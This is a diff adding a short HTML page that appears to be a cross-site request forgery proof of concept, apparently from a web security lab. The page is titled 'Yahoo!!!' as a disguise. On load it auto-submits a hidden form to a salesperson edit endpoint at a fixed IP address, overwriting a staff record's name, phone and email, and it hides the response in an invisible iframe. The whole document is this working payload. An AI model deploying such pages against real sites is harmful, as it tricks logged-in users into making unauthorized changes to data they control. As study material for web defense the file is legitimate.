@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Yahoo!!!</title>
+  </head>
+  <body onload="document.csrfForm.submit()">
+    <form
+      action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=10"
+      method="POST"
+      name="csrfForm"
+      style="display: none"
+      target="hidden_results"
+    >
+      <input type="text" name="first_name" value="SANJANA" />
+      <input type="text" name="last_name" value="AZAD" />
+      <input type="text" name="phone" value="123-456-1234" />
+      <input type="text" name="email" value="sanjana@email.com" />
+    </form>
+    <iframe name="hidden_results" style="display: none"></iframe>
+  </body>
+</html>
